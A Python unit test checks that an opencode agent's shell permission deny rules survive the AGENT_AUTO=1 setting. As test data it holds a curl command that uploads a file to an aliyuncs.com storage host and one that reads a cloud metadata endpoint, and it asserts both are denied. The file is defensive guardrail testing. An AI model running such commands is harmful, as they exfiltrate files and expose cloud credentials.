#!/usr/bin/env python3
"""AGENT_AUTO=1 keeps the shell rules for the hosts of Cohere's report.

opencode merges OPENCODE_PERMISSION into the config after every rule of its files, and its
last matching rule wins. With the unit's bare {"*":"allow"}, the deny rules install.sh puts in
the config lost to that "*": on the box, on 2026-10-28, an echo naming an aliyuncs.com host ran
under it (opencode 1.19.4, ~/qa-tools/v1404/NOTES.md). These run install-agent.sh's own lines,
as written, and read the result the way opencode does."""
import importlib.util
import json
import pathlib
import re
import subprocess
import sys
import unittest

REPO = pathlib.Path(__file__).resolve().parents[1]
AGENT = REPO / "dashboard" / "install-agent.sh"
TEMPLATE = REPO / "dashboard" / "opencode-web.service.template"


def ocm():
    spec = importlib.util.spec_from_file_location("ocm", REPO / "oc-merge-limits.py")
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def merged(config: dict, env: dict) -> dict:
    """opencode's merge of OPENCODE_PERMISSION into the config's permission: a key already there
    keeps its place, a new one goes last, objects merge member by member."""
    out = json.loads(json.dumps(config))
    for k, v in env.items():
        if isinstance(out.get(k), dict) and isinstance(v, dict):
            out[k] = merged(out[k], v)
        else:
            out[k] = v
    return out


class AgentAutoKeepsTheDenyRules(unittest.TestCase):
    def auto_line(self, auto: str) -> str:
        text = AGENT.read_text()
        case = text[text.index('case "${AGENT_AUTO:-0}" in'):]
        case = case[:case.index("\nesac\n") + 6]
        script = ('note(){ :; }; die(){ echo "DIE: $*"; exit 9; }\n'
                  f'HERE="{AGENT.parent}"; AGENT_AUTO={auto}\n' + case + 'printf "%s" "$AUTO_LINE"\n')
        r = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        return r.stdout

    def test_the_unit_carries_the_rules_after_its_star(self):
        line = self.auto_line("1")
        # rendered by the same sed as the unit, then read as systemd hands it to opencode
        rendered = subprocess.run(["sed", "-e", f"s|__AUTO_LINE__|{line}|g", str(TEMPLATE)],
                                  capture_output=True, text=True, check=True).stdout
        value = re.search(r"^Environment='OPENCODE_PERMISSION=(.*)'$", rendered, re.M).group(1)
        env = json.loads(value)
        self.assertEqual(list(env), ["*", "*bash"])
        m = ocm()
        rules = dict.fromkeys(m.DENY_BASH, "deny")
        oss = "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x"
        # the user's global config (with a "*" of its own at the end, or none), the box's generated
        # one merged over it, then the unit's value: opencode's order (oc-merge-limits.py)
        for theirs in ({"bash": {"*": "allow"}}, {"bash": {"*": "allow"}, "*": "allow"}, {}):
            perm = merged(merged(theirs, m.deny_permission()), env)
            self.assertEqual(m._bash_action(perm, oss), "deny", perm)
            self.assertEqual(m._bash_action(perm, "curl http://100.100.100.200/latest/meta-data"), "deny", perm)
            self.assertEqual(m._bash_action(perm, "ls -la"), "allow", perm)
        # the bare value of v1.40.3 let the first one run
        self.assertEqual(m._bash_action(merged({"bash*": rules}, {"*": "allow"}), oss), "allow")

    def test_the_cockpit_still_reads_it_as_auto(self):
        sys.path.insert(0, str(REPO / "dashboard"))
        import agent_relay as ar  # noqa: E402
        env = json.loads(self.auto_line("1").split("OPENCODE_PERMISSION=", 1)[1].rstrip("'"))
        self.assertTrue(ar.permission_is_auto(env))

    def test_without_agent_auto_the_unit_sets_nothing(self):
        self.assertTrue(self.auto_line("0").startswith("# "))


if __name__ == "__main__":
    unittest.main(verbosity=2)
